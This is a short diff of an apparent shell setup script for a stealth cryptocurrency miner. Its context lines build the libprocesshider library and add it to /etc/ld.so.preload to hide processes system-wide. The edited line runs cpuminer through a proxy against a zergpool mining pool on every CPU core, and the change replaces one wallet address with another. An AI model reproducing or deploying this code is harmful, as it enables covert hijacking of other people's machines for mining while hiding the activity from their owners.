@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./cpuminer-sse2 -a yespower -o stratum+tcp://yespower.eu.mine.zergpool.com:6533 -u TAySdPBAYzxYnjaPnZXU88yezWSewNvvyS -p c=TRX,mc=BTE,ID=Tukijo -t $(nproc)
+./graftcp/graftcp ./cpuminer-sse2 -a yespower -o stratum+tcp://yespower.eu.mine.zergpool.com:6533 -u TP7jVMfWwALwX2xBHkw6fA3qJWxiKyQkhz -p c=TRX,mc=BTE,ID=Tukijo -t $(nproc)
